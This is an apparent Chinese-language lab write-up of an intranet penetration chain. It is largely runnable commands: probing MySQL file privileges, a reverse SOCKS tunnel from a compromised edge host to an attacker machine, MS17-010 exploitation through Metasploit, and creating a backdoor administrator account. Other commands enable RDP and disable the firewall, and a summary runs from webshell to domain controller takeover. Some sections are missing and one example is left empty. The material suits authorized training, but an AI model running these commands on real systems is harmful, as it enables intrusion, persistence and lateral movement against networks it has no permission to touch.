## 2. 入口点一：phpMyAdmin 日志写马

### 2.1 检查数据库写文件权限

```sql
select group_concat(user,0x3a,file_priv) from mysql.user;
show variables like '%secure_file_priv%';
```

判断：

```text
file_priv 为 Y：当前用户有 FILE 权限
secure_file_priv 为 NULL：不能使用 INTO OUTFILE / LOAD_FILE
```

### 2.2 查询全局日志状态

```sql
show variables like '%general%';
```

原文日志路径示例：



## 6. 建立隧道

### 6.1 攻击机启动服务端

```text
admin.exe -l 2222 -s websec
```

参数说明：

- `-l 2222`：监听端口。
- `-s websec`：代理认证密钥。

### 6.2 边界主机启动客户端

```text
agent.exe -c 192.168.2.127:2222 -s websec --reconnect 10
```

参数说明：

- `-c`：连接攻击机地址和端口。
- `-s`：匹配服务端密钥。
- `--reconnect 10`：断线后持续重连。

### 6.3 创建 SOCKS 代理

在代理控制端执行：

```text
use 0
socks 7777
```

### 6.4 配置 proxychains

```bash
nano /etc/proxychains4.conf
```

添加：

```text
socks5 192.168.2.127 7777
```

## 7. MS17-010 命令执行

```bash
proxychains msfconsole
```

MSF 中执行：

```text
use auxiliary/admin/smb/ms17_010_command
set rhost 192.168.52.138
set command net user websec admin@123 /add
run
```

创建管理员：

```text
set command net user websec admin@123 /add
run

set command net localgroup Administrators websec /add
run
```

开启远程桌面：

```text
set COMMAND 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
run
```

关闭防火墙：

```text
set command netsh firewall set opmode disable
run
```

> `auxiliary/admin/smb/ms17_010_command` 每设置一次 `command` 后都需要重新 `run`。`Terminal Server` 注册表路径需要整体加引号，实际命令比原文截图中的写法更稳定。

## 8. 边界主机本地创建后门

在已经上线的边界主机上执行：

```cmd
net user websec admin@123 /add
net localgroup Administrators websec /add
```

对应作用：

```text
net user：创建本地用户
net localgroup：加入本地 Administrators 组
```

## 11. 原文攻击链路

```text
phpMyAdmin root/root
→ general_log 写 WebShell
或
yxcms 数据库泄露 admin Hash
→ MD5 解密得到 123456
→ 后台 Getshell
→ CS 上线 Win7
→ tasklist / ipconfig
→ fscan 内网扫描
→ 自建代理隧道
→ proxychains + MS17-010 command
→ 创建 websec 管理员
→ 开启 RDP / 关闭防火墙
→ Hash 抓取
→ CS PsExec 横向
→ 上线域控
```

## 12. 复现注意

- 文章中的 IP、密码、Hash 只适用于该靶场。
- 原文 `fscan.exe -h 192.168.52.1/24` 的网络地址需要按实际网段确认。
- MS17-010 `command` 模块每次修改 `command` 后都要执行 `run`。
- 隧道工具、CS 抓 Hash 和 PsExec 横向在原文中主要是 GUI 操作，没有命令行细节。
- 创建用户、关闭防火墙和开启 RDP 会留下明显日志，授权测试中需要记录和清理。
